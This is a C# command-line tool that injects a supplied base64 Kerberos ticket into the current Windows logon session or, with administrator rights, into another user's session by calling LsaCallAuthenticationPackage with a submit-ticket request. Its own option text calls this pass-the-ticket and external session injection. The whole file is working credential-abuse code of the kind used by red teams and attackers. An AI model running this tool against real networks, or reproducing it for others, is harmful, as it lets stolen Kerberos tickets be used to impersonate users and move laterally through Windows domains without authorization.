using System.CommandLine;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;
using System;

namespace PublishKrbCred
{
  class Program
  {
    static async Task<int> Main(string[] args)
    {
      // defining options
      var krbTicketOption = new Option<string>(
          name: "--ticket",
          description: "KRB credential for PTT");
      var targetSessionLuidOption = new Option<uint>(
          name: "--session",
          description: "security-context luid. 0 for self. High integrity is required for external session injection.");

      // defining commands
      var rootCommand = new RootCommand("Submit provided KRB credential to the specified security context");

      // adding options and commands
      rootCommand.Add(krbTicketOption);
      rootCommand.Add(targetSessionLuidOption);

      // settings handlers
      rootCommand.SetHandler((krbTicketOptionValue, targetSessionLuidOptionValue) => 
          {
          Program.PublishKerberosCredential(krbTicketOptionValue, targetSessionLuidOptionValue);
          }, 
          krbTicketOption, targetSessionLuidOption);

      return await rootCommand.InvokeAsync(args);
    }

    public static List<Interop.LUID> EnumerateLogonSessions()
    {
      // returns a List of LUIDs representing current logon sessions
      var luids = new List<Interop.LUID>();

      var returnValue = Interop.LsaEnumerateLogonSessions(out var count, out var luidPtr);

      if (returnValue != 0)
      {
        throw new System.ComponentModel.Win32Exception(Convert.ToInt32(returnValue));
      }

      for (ulong i = 0; i < count; i++)
      {
        var luid = (Interop.LUID)Marshal.PtrToStructure(luidPtr, typeof(Interop.LUID));
        luids.Add(luid);
        luidPtr = (IntPtr)(luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));
      }
      Interop.LsaFreeReturnBuffer(luidPtr);

      return luids;
    }

    public static Interop.LUID GetCurrentLuid()
    {
      // helper that returns the current logon session ID by using GetTokenInformation w/ TOKEN_INFORMATION_CLASS
      var luid = new Interop.LUID();

      bool Result;
      var TokenStats = new Interop.TOKEN_STATISTICS();
      int TokenInfLength;
      Result = Interop.GetTokenInformation((IntPtr)WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, out TokenStats, Marshal.SizeOf(TokenStats), out TokenInfLength);

      if (Result)
      {
        luid = new Interop.LUID(TokenStats.AuthenticationId);
      }
      else
      {
        var lastError = Interop.GetLastError();
        Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
      }

      return luid;
    }

    public static bool IsHighIntegrity()
    {
      WindowsIdentity identity = WindowsIdentity.GetCurrent();
      WindowsPrincipal principal = new WindowsPrincipal(identity);
      return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }


    public static void PublishKerberosCredential(string b64EncodedTicket, uint targetLuid)
    {
      // convering b64encoded ticket to byte[]
      byte[] ticket = Convert.FromBase64String(b64EncodedTicket);

      // get LSA handle via LsaRegisterLogonProcess
      Interop.LUID targetSession;
      IntPtr lsaHandle;
      // ulong securityMode;
      // var lsaString = new Interop.LSA_STRING();
      // string name = "krb";
      // lsaString.Length = (ushort)name.Length;
      // lsaString.MaximumLength = (ushort)(name.Length + 1);
      // lsaString.Buffer = name;
      Interop.LsaConnectUntrusted(out lsaHandle);

      // get target (if external) or current session LUID
      if (targetLuid != 0 && !IsHighIntegrity())
      {
        Console.WriteLine("[X] High integrity is required to inject into an external session");
        return;
      }
      else if (targetLuid != 0)
      {
        var luidList = EnumerateLogonSessions();
        targetSession = luidList.Where(x => x.LowPart == targetLuid).Single();
      }
      else
      {
        targetSession = GetCurrentLuid();
      }
      Console.WriteLine($"[#] LUID = {targetSession.LowPart}");

      // Retrieving authcPackageId of KERBEROS
      int authcPackageId;
      string authcPackageName = "kerberos";
      var lsaString = new Interop.LSA_STRING();
      lsaString.Length = (ushort)authcPackageName.Length;
      lsaString.MaximumLength = (ushort)(authcPackageName.Length + 1);
      lsaString.Buffer = authcPackageName;
      Interop.NtStatus ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref lsaString, out authcPackageId);
      uint winError;

      // if authcPackageId fails:
      winError = 0;
      winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
      if (ntstatus != 0)
      {
        Console.WriteLine("ntstatus??");
        Console.WriteLine((int)ntstatus);
        var errorMessage = new Win32Exception((int)winError).Message;
        Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
        return;
      }

      // defining submit request property to pass to LSA
      var request = new Interop.KERB_SUBMIT_TKT_REQUEST();
      request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
      request.KerbCredSize = ticket.Length;
      request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));
      if ((ulong)targetLuid != 0) request.LogonId = targetSession;


      // Making a ticket-publish request using LsaCallAuthenticationPackage()
      IntPtr responsePointer = IntPtr.Zero; // out
      int returnBufferLength = 0; // out
      int protocolStatus = 0; // out
      var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
      var inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
      Marshal.StructureToPtr(request, inputBuffer, false);
      Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
      Interop.NtStatus returnValue = Interop.LsaCallAuthenticationPackage(lsaHandle, authcPackageId, inputBuffer, 
          inputBufferSize, out responsePointer, out returnBufferLength, out protocolStatus);

      // handling errors
      // translate the LSA error to a Windows error
      winError = 0;
      winError = Interop.LsaNtStatusToWinError((uint)protocolStatus);
      if (returnValue != 0)
      {
        winError = Interop.LsaNtStatusToWinError((uint)protocolStatus);
        var errorMessage = new Win32Exception((int)winError).Message;
        Console.WriteLine(
            "[X] Error {0} calling LsaCallAuthenticationPackage() : {1}",
            winError, errorMessage);
        return;
      }
      if (protocolStatus != 0)
      {
        winError = Interop.LsaNtStatusToWinError((uint)protocolStatus);
        var errorMessage = new Win32Exception((int)winError).Message;
        Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (protocolStatus): {1}", winError, errorMessage);
        return;
      }
      Console.WriteLine("[#] Credential submitted");


      // cleanup
      if (inputBuffer != IntPtr.Zero)
      {
        Marshal.FreeHGlobal(inputBuffer);
      }

      Interop.LsaDeregisterLogonProcess(lsaHandle);
    }
  }
}
